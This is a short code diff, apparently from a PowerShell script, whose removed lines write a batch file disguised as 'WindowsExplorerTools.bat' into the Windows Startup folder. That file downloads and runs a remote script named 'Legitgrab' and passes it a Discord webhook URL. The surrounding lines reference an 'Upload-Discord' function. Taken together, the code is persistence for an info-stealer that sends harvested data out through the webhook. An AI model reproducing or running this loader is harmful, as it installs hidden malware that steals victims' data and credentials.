@@ -79,14 +79,6 @@ if __name__ == '__main__':
     
 "
 
-cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-Set-Content WindowsExplorerTools.bat [
-PowerShell.exe $hookurl='"https://discord.com/api/webhooks/1063580639472914442/-H6t4_3jPFBl5ChQWH0M65e_f-S66nU6sio5KnoSPeE4IJisaz3LuN8oWTfms4Z7TzHr"';iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/2.0-FULL.ps1).content)
-@echo off
-
-exit
-
-]
 cls
 
 function Upload-Discord {
